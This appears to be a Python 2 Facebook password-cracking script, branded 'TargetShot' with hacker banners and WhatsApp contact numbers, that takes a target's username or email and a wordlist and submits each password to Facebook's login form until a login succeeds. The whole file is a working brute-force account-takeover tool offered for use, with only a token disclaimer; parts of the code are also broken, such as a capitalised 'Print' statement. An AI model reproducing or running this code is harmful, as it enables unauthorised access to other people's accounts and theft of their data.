#!/usr/bin/python
# -*- coding: utf-8 -*-
        
        
        #############################################
        #                                           #
        #    FaceBook TargetShot, by SufyaN AhmaD    #
        #    WhatsApp Contact:       03489458276    #
        #                                           #
        #############################################


import time
import os

os.system('clear')
time.sleep(0.5)
try:
    import mechanize
except ModuleNotFoundError:
    print '[!] Module >Mechanize< Not Found!\n    This module is only available in python 2.x :/\n    Please install mechanize (pip install mechanize) and run the program with python2'
    exit()

#Dev:love_hacker
##### LOGO #####
Print '
\033[1;96m╱╱╱╱╱╱╱╱╭╮
\033[1;96m╱╱╱╱╱╱╱╱┃┃
\033[1;96m╭╮╭╮╭┳━━┫┃╭━━┳━━┳╮╭┳━━╮
\033[1;96m┃╰╯╰╯┃┃━┫┃┃╭━┫╭╮┃╰╯┃┃━┫
\033[1;96m╰╮╭╮╭┫┃━┫╰┫╰━┫╰╯┃┃┃┃┃━┫
\033[1;96m╱╰╯╰╯╰━━┻━┻━━┻━━┻┻┻┻━━╯
  \033[1;96m::♧♧♧♧♧♧♧♧♧♧\033[1;91mWhatsapp    \033[1;96m....0 3 1 0 0 2 8 5 7 9 0 ..... \033[1;96m♧♧♧♧♧♧♧♧♧♧▒▒▒▒▒▒▒::::        
  \033[1;91m:》》》\033[1;93mDon't use it for Illegal activities ....\033[1;91m《《《▒▒▒▒▒▒▒▒▒▒▒:::::
\033[1;95m♡╭───•◈•────╮♡\033[1;96m-▒▒▒ZUBAIR▒▒▒▒▒-\033[1;95m♡╭───•,◈•────╮♡
\033[1;95m ________  _____  _____  ______        _       _____  _______      
\033[1;95m|  __   _||_   _||_   _||_   _ \      / \     |_   _||_   __ \     
\033[1;95m|_/  / /    | |    | |    | |_) |    / _ \      | |    | |__) |    
\033[1;95m   .'.' _   | '    ' |    |  __'.   / ___ \     | |    |  __ /     
\033[1;95m _/ /__/ |   \ \__/ /    _| |__) |_/ /   \ \_  _| |_  _| |  \ \_   
\033[1;95m|________|    `.__.'    |_______/|____| |____||_____||____| |___|
\033[1;93m                                                    
\033[1;95m♡╰───•◈•───╯♡\033[1;96mZUBAIR Ahmad Hacker\033[1;95m♡╰───•◈•───╯♡ '

time.sleep(0.5)
user = raw_input('[?] Target Username/ID/Email >>> ')
time.sleep(0.8)
wrdlstFileName = raw_input('\n[?] Wordlist Directory >>> ')
try:
    wordlist = open(wrdlstFileName, 'r')
except FileNotFoundError:
    print ('\n[!] File Not Found!')
    exit()

time.sleep(0.8)
print '\n\nCracking '+user+' Now...'

time.sleep(1)
print '\n##############√zubair Ahmad TargetAttack√#############\n'
for password in wordlist:
    if password == '' or password == ' ':
        pass
    else:
        try:
            browser = mechanize.Browser()
            browser.set_handle_robots(False)
            browser.addheaders = [('User-agent', "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36")]
            fb = browser.open('https://facebook.com')
            dos = open('Facebook-Log.txt', 'w+')
            browser.select_form(nr=0)
            browser.form['email'] = user
            browser.form['pass'] = password
            browser.method = 'POST'
            browser.submit()
            dos.write(browser.open('https://facebook.com').read())
            dos.seek(0)
            text = dos.read().decode('UTF-8')
            if text.find('home_icon', 0, len(text)) != -1:
                print '[+] Password Found > '+password 
                dos.close()
                os.system('rm Facebook-Log.txt || del Facebook-Log.txt')
                exit()
            else:
                print "[!] Wrong Password! > "+str(password)
        except KeyboardInterrupt:
            print '\n#############################################\n   Exiting..'
            dos.close()
            os.system('rm Facebook-Log.txt || del Facebook-Log.txt')
            exit()

time.sleep(1)
print 'Sorry, none of the passswords in your wordlist is right.'
time.sleep(0.8)
dos.close()
os.system('rm Facebook-Log.txt || del Facebook-Log.txt')
exit()